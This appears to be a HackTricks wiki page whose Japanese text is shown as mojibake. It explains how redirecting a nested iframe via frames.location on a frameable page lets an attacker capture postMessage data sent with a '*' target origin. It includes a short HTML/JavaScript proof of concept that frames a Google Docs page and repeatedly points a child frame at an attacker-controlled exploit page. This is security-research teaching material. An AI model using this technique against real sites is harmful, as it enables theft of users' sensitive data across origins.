# Steal postmessage modifying iframe location

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## å­iframeã®ä½ç½®ã‚’å¤‰æ›´ã™ã‚‹

[**ã“ã®ãƒ¬ãƒãƒ¼ãƒˆ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)ã«ã‚ˆã‚‹ã¨ã€X-Frame-HeaderãŒãªã„ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’iframeåŒ–ã§ãã‚‹å ´åˆã€ãã®ä¸­ã«åˆ¥ã®iframeãŒå«ã¾ã‚Œã¦ã„ã‚‹ã¨ã€**ãã®å­iframeã®ä½ç½®ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚

ä¾‹ãˆã°ã€abc.comãŒefg.comã‚’iframeã¨ã—ã¦æŒã¡ã€abc.comã«X-Frameãƒ˜ãƒƒãƒ€ãƒ¼ãŒãªã„å ´åˆã€**`frames.location`**ã‚’ä½¿ç”¨ã—ã¦efg.comã‚’evil.comã«ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ã§å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã¯ç‰¹ã«**postMessages**ã«ãŠã„ã¦æœ‰ç”¨ã§ã™ã€‚ãªãœãªã‚‰ã€ãƒšãƒ¼ã‚¸ãŒ**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰**ã‚’ä½¿ç”¨ã—ã¦æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã—ã¦ã„ã‚‹å ´åˆã€ä¾‹ãˆã°`windowRef.postmessage("","*")`ã®ã‚ˆã†ã«ã€**é–¢é€£ã™ã‚‹iframeï¼ˆå­ã¾ãŸã¯è¦ªï¼‰ã®ä½ç½®ã‚’æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ä½ç½®ã«å¤‰æ›´ã—ã€ãã®ãƒ‡ãƒ¼ã‚¿ã‚’ç›—ã‚€ã“ã¨ãŒå¯èƒ½ã ã‹ã‚‰ã§ã™**ã€‚
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
//pseudo code
setTimeout(function(){ exp(); }, 6000);

function exp(){
//needs to modify this every 0.1s as it's not clear when the iframe of the iframe affected is created
setInterval(function(){
window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
}, 100);
}
</script>
</html>
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
